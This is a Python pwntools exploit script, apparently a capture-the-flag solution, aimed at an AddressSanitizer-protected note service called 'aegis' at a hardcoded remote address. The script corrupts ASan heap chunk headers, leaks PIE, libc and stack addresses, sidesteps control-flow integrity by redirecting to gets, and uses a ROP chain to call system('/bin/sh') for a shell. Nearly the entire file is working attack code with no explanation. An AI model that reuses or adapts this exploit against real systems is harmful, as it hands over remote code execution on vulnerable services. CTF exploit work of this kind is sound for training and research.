from pwn import *
import sys, time

ip = "111.186.63.209"
port = "6666"

if len(sys.argv) == 1:
    p = process(["./aegis"])

else:
    p = remote(ip, port)

elf = ELF("./aegis")
libc = ELF("./libc-2.27.so")
context.binary = "./aegis"

def add_note(size, cont, ID):
    p.sendlineafter("Choice:", "1")
    p.sendlineafter("Size:", str(size))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def show_note(idx):
    p.sendlineafter("Choice:", "2")
    p.sendlineafter("Index:", str(idx))

def update_note(idx, cont, ID):
    p.sendlineafter("Choice:", "3")
    p.sendlineafter("Index:", str(idx))
    p.sendafter("Content:", cont)
    p.sendlineafter("ID:", ID);

def delete_note(idx):
    p.sendlineafter("Choice:", "4")
    p.sendlineafter("Index:", str(idx))

def secret(addr):
    p.sendlineafter("Choice:", "666")
    p.sendlineafter("Number:", str(addr))

context.log_level = "debug"

for i in xrange(1):
    add_note(0x10, chr(0x31 + i) * 0x8, str(0x4141424241414242))        # 0

add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 1
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 2
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 3
add_note(0x10, chr(0x31 + i) * 0x8, str(0x41414242))        # 4

secret(0x0c047fff8004)

'''
struct ChunkHeader {
  // 1-st 8 bytes.
  u32 chunk_state       : 8;  // Must be first.
  u32 alloc_tid         : 24;

  u32 free_tid          : 24;
  u32 from_memalign     : 1;
  u32 alloc_type        : 2;
  u32 rz_log            : 3;
  u32 lsan_tag          : 2;
  // 2-nd 8 bytes
  // This field is used for small sizes. For large sizes it is equal to
  // SizeClassMap::kMaxSize and the actual size is stored in the
  // SecondaryAllocator's metadata.
  u32 user_requested_size : 29;
u32 user_requested_alignment_log : 3;
  u32 alloc_context_id;
'''

# overwrite index 0 chunk header
#update_note(0, "c" * 0x10 + "\x03" * 2, str(0x9002ffffff001111))

update_note(0, "c" * 0x10 + "\x02\x02", str(0xff0fffffff000041))
update_note(0, "c" * 0x10 + "\x02\x86\x86", str(0x0000faffffff007b))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b", str(0xfffffffaffff0041))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41", str(0xfffffffffaff00ff))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\xff", str(0xfffffffffa0001))
update_note(0, "c" * 0x10 + "\x02\x86\x86\x7b\x41\x42\x43", str(0xffffffff0001))
update_note(0, "c" * 0x10 + p64(0xffffff00000002), str(0xffffffffffff0002))
#show_note(0)


delete_note(4)
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)

add_note(0x10, p64(0x602000000018), str(0x0))       # 5

p.sendline("2")
print p.recv()
p.sendline("0")
print p.recvuntil("Content: ")

pie = u64(p.recv(6).ljust(8, "\x00")) - 0x114AB0
#print p.recv()

elf.address = pie

add_note(0x10, p64(elf.got['puts']), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("1")
libc.address =  u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - libc.symbols['puts']
#print p.recv()

cfi = elf.address + 0x114ab0
environ = libc.address + 0x3ee098
hook = libc.address + 0x7ae140
gets = libc.address + 0x800b0

add_note(0x10, p64(environ), str(0x0))      # 6

p.sendline("2")
print p.recv()
p.sendline("2")
stack = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00")) - 336

print 'pie ->',hex(elf.address)
print 'libc ->', hex(libc.address)
print 'stack ->', hex(stack)
print 'gets ->', hex(gets)


p.sendline("a")
add_note(0x10, p64(0xdeadbeefcafebabe), str(0x41))        # 8
update_note(8, p64(stack) + "A", str(cfi))
p.sendlineafter("Choice:", "3")
p.sendlineafter("Index:", "3")
p.sendline(p64(gets)[:-2])

pop1rdi = elf.address + 0x000000000001c843
system = libc.address + 0x4f440
binsh = libc.address + 0x1b3e9a

p.sendline("11" + p64(pop1rdi) + p64(binsh) + p64(system) * 2)

p.interactive()
